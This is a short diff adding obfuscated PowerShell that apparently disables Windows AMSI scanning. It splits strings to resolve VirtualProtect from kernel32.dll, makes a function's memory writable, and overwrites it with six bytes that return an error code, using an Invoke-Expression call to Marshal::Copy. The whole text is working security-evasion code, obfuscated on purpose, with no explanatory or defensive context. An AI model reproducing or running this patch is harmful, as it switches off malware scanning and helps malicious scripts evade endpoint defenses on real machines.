@@ -28,3 +28,14 @@ $ab = GetAddress $a $b
 
 $vp = [System.Runtime.InteropServices.Marshal]::("{2}{3}{5}{4}{1}{0}" -f 'Pointer','nction','GetDelega','teFo','u','rF').Invoke((GetAddress ("kern" + "el3" + "2.dl" + "l") ("Vi" + "rtu" + "alPr" + "ote" + "ct")), (GetType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Boolean])))
 
+$p = 0
+$vp.Invoke($ab, [uint32]5, 0x40, [Ref] $p) | Out-Null
+$pb = [Byte[]] (184, 87, 0, 7, 128, 195)
+$s = "[System."
+$s += "Runti" + "me"
+$s += ".Inte" + "ropSer" + "vices"
+$s += ".Mars" + "hal]"
+$s += "::"
+$s += "Copy"
+
+$i = Invoke-Expression ($s + "(`$pb, 0, `$ab, 6)")
